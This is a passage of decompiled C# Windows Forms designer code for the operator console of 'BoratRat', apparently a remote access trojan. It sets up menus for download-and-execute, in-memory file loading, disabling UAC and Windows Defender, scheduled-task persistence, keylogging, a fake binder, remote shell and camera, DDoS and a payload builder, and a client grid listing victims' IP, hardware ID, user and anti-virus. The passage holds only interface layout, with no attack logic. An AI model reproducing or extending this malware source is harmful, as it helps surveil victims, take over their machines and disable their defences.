			this.normalInstallToolStripMenuItem.Name = "normalInstallToolStripMenuItem";
			this.normalInstallToolStripMenuItem.Size = new global::System.Drawing.Size(163, 22);
			this.normalInstallToolStripMenuItem.Text = "Normal Install";
			this.normalInstallToolStripMenuItem.Click += new global::System.EventHandler(this.normalInstallToolStripMenuItem_Click);
			this.normalUninstallToolStripMenuItem.Name = "normalUninstallToolStripMenuItem";
			this.normalUninstallToolStripMenuItem.Size = new global::System.Drawing.Size(163, 22);
			this.normalUninstallToolStripMenuItem.Text = "Normal Uninstall";
			this.normalUninstallToolStripMenuItem.Click += new global::System.EventHandler(this.normalUninstallToolStripMenuItem_Click);
			this.justForFunToolStripMenuItem.Name = "justForFunToolStripMenuItem";
			this.justForFunToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.justForFunToolStripMenuItem.Text = "Utils";
			this.justForFunToolStripMenuItem.Click += new global::System.EventHandler(this.justForFunToolStripMenuItem_Click);
			this.InformationToolStripMenuItem.Name = "InformationToolStripMenuItem";
			this.InformationToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.InformationToolStripMenuItem.Text = "Information";
			this.InformationToolStripMenuItem.Click += new global::System.EventHandler(this.InformationToolStripMenuItem_Click);
			this.statusStrip1.AutoSize = false;
			this.statusStrip1.BackColor = global::System.Drawing.Color.FromArgb(60, 63, 65);
			this.statusStrip1.ForeColor = global::System.Drawing.Color.FromArgb(220, 220, 220);
			this.statusStrip1.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.statusStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.toolStripStatusLabel1,
				this.toolStripStatusLabel2
			});
			this.statusStrip1.Location = new global::System.Drawing.Point(0, 436);
			this.statusStrip1.Name = "statusStrip1";
			this.statusStrip1.Padding = new global::System.Windows.Forms.Padding(1, 0, 9, 0);
			this.statusStrip1.Size = new global::System.Drawing.Size(867, 22);
			this.statusStrip1.SizingGrip = false;
			this.statusStrip1.TabIndex = 1;
			this.statusStrip1.Text = "statusStrip1";
			this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
			this.toolStripStatusLabel1.Size = new global::System.Drawing.Size(16, 17);
			this.toolStripStatusLabel1.Text = "...";
			this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
			this.toolStripStatusLabel2.Size = new global::System.Drawing.Size(130, 17);
			this.toolStripStatusLabel2.Text = "                    Notification";
			this.toolStripStatusLabel2.Click += new global::System.EventHandler(this.ToolStripStatusLabel2_Click);
			this.ping.Enabled = true;
			this.ping.Interval = 30000;
			this.ping.Tick += new global::System.EventHandler(this.ping_Tick);
			this.UpdateUI.Enabled = true;
			this.UpdateUI.Interval = 500;
			this.UpdateUI.Tick += new global::System.EventHandler(this.UpdateUI_Tick);
			this.contextMenuLogs.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.contextMenuLogs.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.cLEARToolStripMenuItem
			});
			this.contextMenuLogs.Name = "contextMenuLogs";
			this.contextMenuLogs.ShowImageMargin = false;
			this.contextMenuLogs.Size = new global::System.Drawing.Size(77, 26);
			this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
			this.cLEARToolStripMenuItem.Size = new global::System.Drawing.Size(76, 22);
			this.cLEARToolStripMenuItem.Text = "Clear";
			this.cLEARToolStripMenuItem.Click += new global::System.EventHandler(this.CLEARToolStripMenuItem_Click);
			this.contextMenuThumbnail.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.contextMenuThumbnail.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.sTARTToolStripMenuItem,
				this.sTOPToolStripMenuItem
			});
			this.contextMenuThumbnail.Name = "contextMenuStrip2";
			this.contextMenuThumbnail.Size = new global::System.Drawing.Size(99, 48);
			this.sTARTToolStripMenuItem.ForeColor = global::System.Drawing.SystemColors.ControlText;
			this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
			this.sTARTToolStripMenuItem.Size = new global::System.Drawing.Size(98, 22);
			this.sTARTToolStripMenuItem.Text = "Start";
			this.sTARTToolStripMenuItem.Click += new global::System.EventHandler(this.STARTToolStripMenuItem_Click);
			this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
			this.sTOPToolStripMenuItem.Size = new global::System.Drawing.Size(98, 22);
			this.sTOPToolStripMenuItem.Text = "Stop";
			this.sTOPToolStripMenuItem.Click += new global::System.EventHandler(this.STOPToolStripMenuItem_Click);
			this.ThumbnailImageList.ColorDepth = global::System.Windows.Forms.ColorDepth.Depth16Bit;
			this.ThumbnailImageList.ImageSize = new global::System.Drawing.Size(256, 256);
			this.ThumbnailImageList.TransparentColor = global::System.Drawing.Color.Transparent;
			this.contextMenuTasks.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.contextMenuTasks.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.sendFileFromUrlToolStripMenuItem,
				this.downloadAndExecuteToolStripMenuItem,
				this.sENDFILETOMEMORYToolStripMenuItem1,
				this.disableUACToolStripMenuItem1,
				this.disableWDToolStripMenuItem1,
				this.installSchtaskToolStripMenuItem,
				this.uPDATEToolStripMenuItem1,
				this.autoKeyloggerToolStripMenuItem,
				this.fakeBinderToolStripMenuItem,
				this.toolStripSeparator4,
				this.dELETETASKToolStripMenuItem
			});
			this.contextMenuTasks.Name = "contextMenuStrip4";
			this.contextMenuTasks.ShowImageMargin = false;
			this.contextMenuTasks.Size = new global::System.Drawing.Size(157, 230);
			this.sendFileFromUrlToolStripMenuItem.Name = "sendFileFromUrlToolStripMenuItem";
			this.sendFileFromUrlToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.sendFileFromUrlToolStripMenuItem.Text = "Send file from url";
			this.sendFileFromUrlToolStripMenuItem.Click += new global::System.EventHandler(this.sendFileFromUrlToolStripMenuItem_Click);
			this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
			this.downloadAndExecuteToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.downloadAndExecuteToolStripMenuItem.Text = "Send file to disk";
			this.downloadAndExecuteToolStripMenuItem.Click += new global::System.EventHandler(this.DownloadAndExecuteToolStripMenuItem_Click);
			this.sENDFILETOMEMORYToolStripMenuItem1.Name = "sENDFILETOMEMORYToolStripMenuItem1";
			this.sENDFILETOMEMORYToolStripMenuItem1.Size = new global::System.Drawing.Size(156, 22);
			this.sENDFILETOMEMORYToolStripMenuItem1.Text = "Send file to memory";
			this.sENDFILETOMEMORYToolStripMenuItem1.Click += new global::System.EventHandler(this.SENDFILETOMEMORYToolStripMenuItem1_Click);
			this.disableUACToolStripMenuItem1.Name = "disableUACToolStripMenuItem1";
			this.disableUACToolStripMenuItem1.Size = new global::System.Drawing.Size(156, 22);
			this.disableUACToolStripMenuItem1.Text = "Disable UAC";
			this.disableUACToolStripMenuItem1.Click += new global::System.EventHandler(this.disableUACToolStripMenuItem1_Click);
			this.disableWDToolStripMenuItem1.Name = "disableWDToolStripMenuItem1";
			this.disableWDToolStripMenuItem1.Size = new global::System.Drawing.Size(156, 22);
			this.disableWDToolStripMenuItem1.Text = "Disable WD";
			this.disableWDToolStripMenuItem1.Click += new global::System.EventHandler(this.disableWDToolStripMenuItem1_Click);
			this.installSchtaskToolStripMenuItem.Name = "installSchtaskToolStripMenuItem";
			this.installSchtaskToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.installSchtaskToolStripMenuItem.Text = "Install Schtask";
			this.installSchtaskToolStripMenuItem.Click += new global::System.EventHandler(this.installSchtaskToolStripMenuItem_Click);
			this.uPDATEToolStripMenuItem1.Name = "uPDATEToolStripMenuItem1";
			this.uPDATEToolStripMenuItem1.Size = new global::System.Drawing.Size(156, 22);
			this.uPDATEToolStripMenuItem1.Text = "Update all clients";
			this.uPDATEToolStripMenuItem1.Click += new global::System.EventHandler(this.UPDATEToolStripMenuItem1_Click);
			this.autoKeyloggerToolStripMenuItem.Name = "autoKeyloggerToolStripMenuItem";
			this.autoKeyloggerToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.autoKeyloggerToolStripMenuItem.Text = "Auto Keylogger";
			this.autoKeyloggerToolStripMenuItem.Click += new global::System.EventHandler(this.autoKeyloggerToolStripMenuItem_Click);
			this.fakeBinderToolStripMenuItem.Name = "fakeBinderToolStripMenuItem";
			this.fakeBinderToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.fakeBinderToolStripMenuItem.Text = "Fake Binder";
			this.fakeBinderToolStripMenuItem.Click += new global::System.EventHandler(this.fakeBinderToolStripMenuItem_Click);
			this.toolStripSeparator4.Name = "toolStripSeparator4";
			this.toolStripSeparator4.Size = new global::System.Drawing.Size(153, 6);
			this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
			this.dELETETASKToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.dELETETASKToolStripMenuItem.Text = "Delete";
			this.dELETETASKToolStripMenuItem.Click += new global::System.EventHandler(this.DELETETASKToolStripMenuItem_Click);
			this.performanceCounter1.CategoryName = "Processor";
			this.performanceCounter1.CounterName = "% Processor Time";
			this.performanceCounter1.InstanceName = "_Total";
			this.performanceCounter2.CategoryName = "Memory";
			this.performanceCounter2.CounterName = "% Committed Bytes In Use";
			this.notifyIcon1.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("notifyIcon1.Icon");
			this.notifyIcon1.Text = "BoratRat";
			this.notifyIcon1.Visible = true;
			this.TimerTask.Enabled = true;
			this.TimerTask.Interval = 5000;
			this.TimerTask.Tick += new global::System.EventHandler(this.TimerTask_Tick);
			this.menuStrip1.BackColor = global::System.Drawing.Color.FromArgb(60, 63, 65);
			this.menuStrip1.ForeColor = global::System.Drawing.Color.FromArgb(220, 220, 220);
			this.menuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.FileToolStripMenuItem
			});
			this.menuStrip1.Location = new global::System.Drawing.Point(0, 0);
			this.menuStrip1.Name = "menuStrip1";
			this.menuStrip1.Padding = new global::System.Windows.Forms.Padding(3, 2, 0, 2);
			this.menuStrip1.Size = new global::System.Drawing.Size(867, 24);
			this.menuStrip1.TabIndex = 4;
			this.menuStrip1.Text = "menuStrip1";
			this.FileToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(60, 63, 65);
			this.FileToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.BuilderToolStripMenuItem,
				this.BlockToolStripMenuItem
			});
			this.FileToolStripMenuItem.ForeColor = global::System.Drawing.Color.FromArgb(220, 220, 220);
			this.FileToolStripMenuItem.Name = "FileToolStripMenuItem";
			this.FileToolStripMenuItem.Size = new global::System.Drawing.Size(37, 20);
			this.FileToolStripMenuItem.Text = "File";
			this.BuilderToolStripMenuItem.ForeColor = global::System.Drawing.Color.FromArgb(220, 220, 220);
			this.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem";
			this.BuilderToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.BuilderToolStripMenuItem.Text = "Builder";
			this.BuilderToolStripMenuItem.Click += new global::System.EventHandler(this.builderToolStripMenuItem1_Click);
			this.BlockToolStripMenuItem.ForeColor = global::System.Drawing.Color.FromArgb(220, 220, 220);
			this.BlockToolStripMenuItem.Name = "BlockToolStripMenuItem";
			this.BlockToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.BlockToolStripMenuItem.Text = "Blacklist";
			this.BlockToolStripMenuItem.Click += new global::System.EventHandler(this.BlockToolStripMenuItem_Click);
			this.splitContainer1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.splitContainer1.Location = new global::System.Drawing.Point(0, 24);
			this.splitContainer1.Name = "splitContainer1";
			this.splitContainer1.Orientation = global::System.Windows.Forms.Orientation.Horizontal;
			this.splitContainer1.Panel1.Controls.Add(this.tabControl1);
			this.splitContainer1.Panel2.Controls.Add(this.listView2);
			this.splitContainer1.Size = new global::System.Drawing.Size(867, 412);
			this.splitContainer1.SplitterDistance = 248;
			this.splitContainer1.TabIndex = 5;
			this.tabControl1.Controls.Add(this.tabPage1);
			this.tabControl1.Controls.Add(this.tabPage3);
			this.tabControl1.Controls.Add(this.tabPage4);
			this.tabControl1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.tabControl1.Location = new global::System.Drawing.Point(0, 0);
			this.tabControl1.Margin = new global::System.Windows.Forms.Padding(2);
			this.tabControl1.Name = "tabControl1";
			this.tabControl1.SelectedIndex = 0;
			this.tabControl1.Size = new global::System.Drawing.Size(867, 248);
			this.tabControl1.SizeMode = global::System.Windows.Forms.TabSizeMode.Fixed;
			this.tabControl1.TabIndex = 3;
			this.tabPage1.Controls.Add(this.listView1);
			this.tabPage1.Location = new global::System.Drawing.Point(4, 22);
			this.tabPage1.Margin = new global::System.Windows.Forms.Padding(2);
			this.tabPage1.Name = "tabPage1";
			this.tabPage1.Padding = new global::System.Windows.Forms.Padding(2);
			this.tabPage1.Size = new global::System.Drawing.Size(859, 222);
			this.tabPage1.TabIndex = 0;
			this.tabPage1.Text = "Clients";
			this.listView1.BackColor = global::System.Drawing.Color.FromArgb(69, 73, 74);
			this.listView1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.listView1.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.lv_ip,
				this.lv_country,
				this.lv_group,
				this.lv_hwid,
				this.lv_user,
				this.lv_camera,
				this.lv_os,
				this.lv_version,
				this.lv_ins,
				this.lv_admin,
				this.lv_av,
				this.lv_ping,
				this.lv_act
			});
			this.listView1.ContextMenuStrip = this.contextMenuClient;
			this.listView1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.listView1.FullRowSelect = true;
			this.listView1.GridLines = true;
			this.listView1.HideSelection = false;
			this.listView1.Location = new global::System.Drawing.Point(2, 2);
			this.listView1.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView1.Name = "listView1";
			this.listView1.ShowGroups = false;
			this.listView1.ShowItemToolTips = true;
			this.listView1.Size = new global::System.Drawing.Size(855, 218);
			this.listView1.TabIndex = 0;
			this.listView1.UseCompatibleStateImageBehavior = false;
			this.listView1.View = global::System.Windows.Forms.View.Details;
			this.listView1.ColumnClick += new global::System.Windows.Forms.ColumnClickEventHandler(this.ListView1_ColumnClick);
			this.listView1.KeyDown += new global::System.Windows.Forms.KeyEventHandler(this.listView1_KeyDown);
			this.listView1.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.listView1_MouseMove);
			this.lv_ip.Text = "IP Port";
			this.lv_ip.Width = 121;
			this.lv_country.Text = "Country";
			this.lv_country.Width = 124;
			this.lv_group.Text = "Group";
			this.lv_hwid.Text = "HWID";
			this.lv_hwid.Width = 117;
			this.lv_user.Text = "User";
			this.lv_user.Width = 117;
			this.lv_camera.Text = "Camera";
			this.lv_os.Text = "OS version";
			this.lv_os.Width = 179;
			this.lv_version.Text = "Client version";
			this.lv_version.Width = 126;
			this.lv_ins.Text = "Installed time";
			this.lv_ins.Width = 120;
			this.lv_admin.Text = "Permission";
			this.lv_admin.Width = 166;
			this.lv_av.Text = "Anti-virus";
			this.lv_av.Width = 136;
			this.lv_ping.Text = "Ping";
			this.lv_act.Text = "Activity Program";
			this.lv_act.Width = 350;
			this.tabPage3.Controls.Add(this.listView3);
			this.tabPage3.Location = new global::System.Drawing.Point(4, 22);
			this.tabPage3.Margin = new global::System.Windows.Forms.Padding(2);
			this.tabPage3.Name = "tabPage3";
			this.tabPage3.Size = new global::System.Drawing.Size(859, 215);
			this.tabPage3.TabIndex = 2;
			this.tabPage3.Text = "Screens";
			this.tabPage3.UseVisualStyleBackColor = true;
			this.listView3.BackColor = global::System.Drawing.Color.FromArgb(69, 73, 74);
			this.listView3.ContextMenuStrip = this.contextMenuThumbnail;
			this.listView3.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView3.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.listView3.HideSelection = false;
			this.listView3.LargeImageList = this.ThumbnailImageList;
			this.listView3.Location = new global::System.Drawing.Point(0, 0);
			this.listView3.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView3.Name = "listView3";
			this.listView3.ShowItemToolTips = true;
			this.listView3.Size = new global::System.Drawing.Size(859, 215);
			this.listView3.SmallImageList = this.ThumbnailImageList;
			this.listView3.TabIndex = 0;
			this.listView3.UseCompatibleStateImageBehavior = false;
			this.tabPage4.Controls.Add(this.listView4);
			this.tabPage4.Location = new global::System.Drawing.Point(4, 22);
			this.tabPage4.Margin = new global::System.Windows.Forms.Padding(2);
			this.tabPage4.Name = "tabPage4";
			this.tabPage4.Padding = new global::System.Windows.Forms.Padding(2);
			this.tabPage4.Size = new global::System.Drawing.Size(859, 215);
			this.tabPage4.TabIndex = 3;
			this.tabPage4.Text = "Auto Task";
			this.tabPage4.UseVisualStyleBackColor = true;
			this.listView4.BackColor = global::System.Drawing.Color.FromArgb(69, 73, 74);
			this.listView4.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.listView4.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.columnHeader4,
				this.columnHeader5
			});
			this.listView4.ContextMenuStrip = this.contextMenuTasks;
			this.listView4.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView4.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.listView4.FullRowSelect = true;
			this.listView4.HideSelection = false;
			this.listView4.Location = new global::System.Drawing.Point(2, 2);
			this.listView4.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView4.Name = "listView4";
			this.listView4.Size = new global::System.Drawing.Size(855, 211);
			this.listView4.TabIndex = 0;
			this.listView4.UseCompatibleStateImageBehavior = false;
			this.listView4.View = global::System.Windows.Forms.View.Details;
			this.columnHeader4.Text = "Task";
			this.columnHeader4.Width = 97;
			this.columnHeader5.Text = "Run times";
			this.columnHeader5.Width = 116;
			this.ConnectTimeout.Enabled = true;
			this.ConnectTimeout.Interval = 5000;
			this.ConnectTimeout.Tick += new global::System.EventHandler(this.ConnectTimeout_Tick);
			this.columnHeader1.Text = "Time";
			this.columnHeader1.Width = 150;
			this.columnHeader2.Text = "Logs";
			this.columnHeader2.Width = 705;
			this.listView2.BackColor = global::System.Drawing.Color.FromArgb(69, 73, 74);
			this.listView2.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.listView2.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.columnHeader1,
				this.columnHeader2
			});
			this.listView2.ContextMenuStrip = this.contextMenuLogs;
			this.listView2.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView2.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.listView2.FullRowSelect = true;
			this.listView2.GridLines = true;
			this.listView2.HideSelection = false;
			this.listView2.Location = new global::System.Drawing.Point(0, 0);
			this.listView2.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView2.Name = "listView2";
			this.listView2.ShowGroups = false;
			this.listView2.ShowItemToolTips = true;
			this.listView2.Size = new global::System.Drawing.Size(867, 160);
			this.listView2.TabIndex = 2;
			this.listView2.UseCompatibleStateImageBehavior = false;
			this.listView2.View = global::System.Windows.Forms.View.Details;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(867, 458);
			base.Controls.Add(this.splitContainer1);
			base.Controls.Add(this.statusStrip1);
			base.Controls.Add(this.menuStrip1);
			base.MainMenuStrip = this.menuStrip1;
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.Name = "Form1";
			base.ShowIcon = false;
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "BoratRat";
			base.Activated += new global::System.EventHandler(this.Form1_Activated);
			base.Deactivate += new global::System.EventHandler(this.Form1_Deactivate);
			base.FormClosed += new global::System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
			base.Load += new global::System.EventHandler(this.Form1_Load);
			this.contextMenuClient.ResumeLayout(false);
			this.statusStrip1.ResumeLayout(false);
			this.statusStrip1.PerformLayout();
			this.contextMenuLogs.ResumeLayout(false);
			this.contextMenuThumbnail.ResumeLayout(false);
			this.contextMenuTasks.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter1).EndInit();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter2).EndInit();
			this.menuStrip1.ResumeLayout(false);
			this.menuStrip1.PerformLayout();
			this.splitContainer1.Panel1.ResumeLayout(false);
			this.splitContainer1.Panel2.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.splitContainer1).EndInit();
			this.splitContainer1.ResumeLayout(false);
			this.tabControl1.ResumeLayout(false);
			this.tabPage1.ResumeLayout(false);
			this.tabPage3.ResumeLayout(false);
			this.tabPage4.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000025 RID: 37
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000026 RID: 38
		private global::System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel1;

		// Token: 0x04000027 RID: 39
		private global::System.Windows.Forms.Timer ping;

		// Token: 0x04000028 RID: 40
		private global::System.Windows.Forms.Timer UpdateUI;

		// Token: 0x04000029 RID: 41
		private global::System.Diagnostics.PerformanceCounter performanceCounter1;

		// Token: 0x0400002A RID: 42
		private global::System.Diagnostics.PerformanceCounter performanceCounter2;

		// Token: 0x0400002B RID: 43
		private global::System.Windows.Forms.ContextMenuStrip contextMenuThumbnail;

		// Token: 0x0400002C RID: 44
		private global::System.Windows.Forms.ToolStripMenuItem sTARTToolStripMenuItem;

		// Token: 0x0400002D RID: 45
		private global::System.Windows.Forms.ToolStripMenuItem sTOPToolStripMenuItem;

		// Token: 0x0400002E RID: 46
		public global::System.Windows.Forms.ImageList ThumbnailImageList;

		// Token: 0x0400002F RID: 47
		public global::System.Windows.Forms.NotifyIcon notifyIcon1;

		// Token: 0x04000030 RID: 48
		private global::System.Windows.Forms.ContextMenuStrip contextMenuTasks;

		// Token: 0x04000031 RID: 49
		private global::System.Windows.Forms.ToolStripMenuItem downloadAndExecuteToolStripMenuItem;

		// Token: 0x04000032 RID: 50
		private global::System.Windows.Forms.ToolStripMenuItem sENDFILETOMEMORYToolStripMenuItem1;

		// Token: 0x04000033 RID: 51
		private global::System.Windows.Forms.ToolStripMenuItem uPDATEToolStripMenuItem1;

		// Token: 0x04000034 RID: 52
		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator4;

		// Token: 0x04000035 RID: 53
		private global::System.Windows.Forms.ToolStripMenuItem dELETETASKToolStripMenuItem;

		// Token: 0x04000036 RID: 54
		private global::System.Windows.Forms.Timer TimerTask;

		// Token: 0x04000037 RID: 55
		private global::System.Windows.Forms.ContextMenuStrip contextMenuLogs;

		// Token: 0x04000038 RID: 56
		private global::System.Windows.Forms.ToolStripMenuItem cLEARToolStripMenuItem;

		// Token: 0x04000039 RID: 57
		private global::System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel2;

		// Token: 0x0400003A RID: 58
		private global::System.Windows.Forms.ContextMenuStrip contextMenuClient;

		// Token: 0x0400003B RID: 59
		private global::System.Windows.Forms.ToolStripMenuItem RemoteManagerToolStripMenuItem;

		// Token: 0x0400003C RID: 60
		private global::System.Windows.Forms.ToolStripMenuItem RemoteShellToolStripMenuItem;

		// Token: 0x0400003D RID: 61
		private global::System.Windows.Forms.ToolStripMenuItem RemoteScreenToolStripMenuItem;

		// Token: 0x0400003E RID: 62
		private global::System.Windows.Forms.ToolStripMenuItem RemoteCameraToolStripMenuItem;

		// Token: 0x0400003F RID: 63
		private global::System.Windows.Forms.ToolStripMenuItem FileManagerToolStripMenuItem1;

		// Token: 0x04000040 RID: 64
		private global::System.Windows.Forms.ToolStripMenuItem ProcessManagerToolStripMenuItem;

		// Token: 0x04000041 RID: 65
		private global::System.Windows.Forms.ToolStripMenuItem ProgramNotificationToolStripMenuItem;

		// Token: 0x04000042 RID: 66
		private global::System.Windows.Forms.ToolStripMenuItem RemoteControlToolStripMenuItem;

		// Token: 0x04000043 RID: 67
		private global::System.Windows.Forms.ToolStripMenuItem SendFileToolStripMenuItem1;

		// Token: 0x04000044 RID: 68
		private global::System.Windows.Forms.ToolStripMenuItem SendFileToDiskToolStripMenuItem;

		// Token: 0x04000045 RID: 69
		private global::System.Windows.Forms.ToolStripMenuItem SendFileToMemoryToolStripMenuItem;

		// Token: 0x04000046 RID: 70
		private global::System.Windows.Forms.ToolStripMenuItem MessageBoxToolStripMenuItem;

		// Token: 0x04000047 RID: 71
		private global::System.Windows.Forms.ToolStripMenuItem ChatToolStripMenuItem1;

		// Token: 0x04000048 RID: 72
		private global::System.Windows.Forms.ToolStripMenuItem VisteWebsiteToolStripMenuItem1;

		// Token: 0x04000049 RID: 73
		private global::System.Windows.Forms.ToolStripMenuItem ChangeWallpaperToolStripMenuItem1;

		// Token: 0x0400004A RID: 74
		private global::System.Windows.Forms.ToolStripMenuItem KeyloggerToolStripMenuItem1;

		// Token: 0x0400004B RID: 75
		private global::System.Windows.Forms.ToolStripMenuItem SystemControlToolStripMenuItem;

		// Token: 0x0400004C RID: 76
		private global::System.Windows.Forms.ToolStripMenuItem ClientControlToolStripMenuItem;

		// Token: 0x0400004D RID: 77
		private global::System.Windows.Forms.ToolStripMenuItem StopToolStripMenuItem1;

		// Token: 0x0400004E RID: 78
		private global::System.Windows.Forms.ToolStripMenuItem RestartToolStripMenuItem1;

		// Token: 0x0400004F RID: 79
		private global::System.Windows.Forms.ToolStripMenuItem UpdateToolStripMenuItem;

		// Token: 0x04000050 RID: 80
		private global::System.Windows.Forms.ToolStripMenuItem UninstallToolStripMenuItem;

		// Token: 0x04000051 RID: 81
		private global::System.Windows.Forms.ToolStripMenuItem ClientFolderToolStripMenuItem;

		// Token: 0x04000052 RID: 82
		private global::System.Windows.Forms.ToolStripMenuItem SystemToolStripMenuItem;

		// Token: 0x04000053 RID: 83
		private global::System.Windows.Forms.ToolStripMenuItem ShutDownToolStripMenuItem;

		// Token: 0x04000054 RID: 84
		private global::System.Windows.Forms.ToolStripMenuItem RebootToolStripMenuItem;

		// Token: 0x04000055 RID: 85
		private global::System.Windows.Forms.ToolStripMenuItem LogoutToolStripMenuItem;

		// Token: 0x04000056 RID: 86
		private global::System.Windows.Forms.ToolStripMenuItem BypassUACAToolStripMenuItem;

		// Token: 0x04000057 RID: 87
		private global::System.Windows.Forms.SplitContainer splitContainer1;

		// Token: 0x04000058 RID: 88
		private global::System.Windows.Forms.TabControl tabControl1;

		// Token: 0x04000059 RID: 89
		private global::System.Windows.Forms.TabPage tabPage1;

		// Token: 0x0400005A RID: 90
		public global::System.Windows.Forms.ListView listView1;

		// Token: 0x0400005B RID: 91
		private global::System.Windows.Forms.ColumnHeader lv_ip;

		// Token: 0x0400005C RID: 92
		private global::System.Windows.Forms.ColumnHeader lv_country;

		// Token: 0x0400005D RID: 93
		public global::System.Windows.Forms.ColumnHeader lv_hwid;

		// Token: 0x0400005E RID: 94
		private global::System.Windows.Forms.ColumnHeader lv_user;

		// Token: 0x0400005F RID: 95
		private global::System.Windows.Forms.ColumnHeader lv_os;

		// Token: 0x04000060 RID: 96
		private global::System.Windows.Forms.ColumnHeader lv_version;

		// Token: 0x04000061 RID: 97
		private global::System.Windows.Forms.ColumnHeader lv_ins;

		// Token: 0x04000062 RID: 98
		private global::System.Windows.Forms.ColumnHeader lv_admin;

		// Token: 0x04000063 RID: 99
		private global::System.Windows.Forms.ColumnHeader lv_av;

		// Token: 0x04000064 RID: 100
		public global::System.Windows.Forms.ColumnHeader lv_ping;

		// Token: 0x04000065 RID: 101
		public global::System.Windows.Forms.ColumnHeader lv_act;

		// Token: 0x04000066 RID: 102
		private global::System.Windows.Forms.TabPage tabPage3;

		// Token: 0x04000067 RID: 103
		public global::System.Windows.Forms.ListView listView3;

		// Token: 0x04000068 RID: 104
		private global::System.Windows.Forms.TabPage tabPage4;

		// Token: 0x04000069 RID: 105
		public global::System.Windows.Forms.ListView listView4;

		// Token: 0x0400006A RID: 106
		private global::System.Windows.Forms.ColumnHeader columnHeader4;

		// Token: 0x0400006B RID: 107
		private global::System.Windows.Forms.ColumnHeader columnHeader5;

		// Token: 0x0400006C RID: 108
		private global::System.Windows.Forms.ToolStripMenuItem FileToolStripMenuItem;

		// Token: 0x0400006D RID: 109
		private global::System.Windows.Forms.ToolStripMenuItem BuilderToolStripMenuItem;

		// Token: 0x0400006E RID: 110
		private global::System.Windows.Forms.ToolStripMenuItem StartToolStripMenuItem1;

		// Token: 0x0400006F RID: 111
		private global::System.Windows.Forms.ToolStripMenuItem StopToolStripMenuItem2;

		// Token: 0x04000070 RID: 112
		private global::System.Windows.Forms.ToolStripMenuItem BlockToolStripMenuItem;

		// Token: 0x04000071 RID: 113
		private global::System.Windows.Forms.ToolStripMenuItem FileSearchToolStripMenuItem;

		// Token: 0x04000072 RID: 114
		private global::System.Windows.Forms.ColumnHeader lv_group;

		// Token: 0x04000073 RID: 115
		private global::System.Windows.Forms.ToolStripMenuItem InformationToolStripMenuItem;

		// Token: 0x04000074 RID: 116
		private global::System.Windows.Forms.ToolStripMenuItem MalwareToolStripMenuItem;

		// Token: 0x04000075 RID: 117
		private global::System.Windows.Forms.ToolStripMenuItem dDOSToolStripMenuItem;

		// Token: 0x04000076 RID: 118
